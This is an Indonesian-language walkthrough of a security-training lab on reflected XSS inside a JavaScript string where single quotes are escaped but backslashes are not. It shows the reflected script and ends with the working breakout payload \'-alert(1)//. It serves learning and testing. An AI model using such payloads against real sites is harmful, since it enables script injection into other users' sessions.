# Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped

Lab ini mengandung kerentanan **reflected cross-site scripting (XSS)** pada fitur pelacakan query pencarian, di mana **tanda kurung sudut (< dan >) di-encode sebagai HTML** dan **tanda kutip tunggal di-escape**.

Untuk menyelesaikan lab ini, lakukan serangan **cross-site scripting (XSS)** yang dapat keluar dari string JavaScript tersebut dan memanggil fungsi `alert`.


## Solusi 

1. Masukkan string alfanumerik acak ke dalam kotak pencarian, seperti `TESTING123`.

2. Perhatikan bahwa string acak tersebut direfleksikan di dalam **string JavaScript**.

```html
<script>
var searchTerms = 'TESTING123';
document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```

3. Coba kirim payload:

```text 
test'payload
```

dan perhatikan bahwa tanda kutip tunggal di-escape dengan backslash, sehingga kamu tidak bisa keluar dari string.


```html
<script>
var searchTerms = 'test\'payload';
document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```

4. Coba kirim payload:

```text
test\payload
```

dan perhatikan bahwa backslash tidak di-escape.

```html
<script>
var searchTerms = 'test\payload';
document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```

5. Ganti input dengan payload berikut untuk keluar dari string JavaScript dan menyisipkan `alert`:

```text id="p3"
\'-alert(1)//
```

6. Verifikasi teknik berhasil dengan klik kanan → **Copy URL**, lalu buka di browser. Saat halaman dimuat, seharusnya memicu alert.
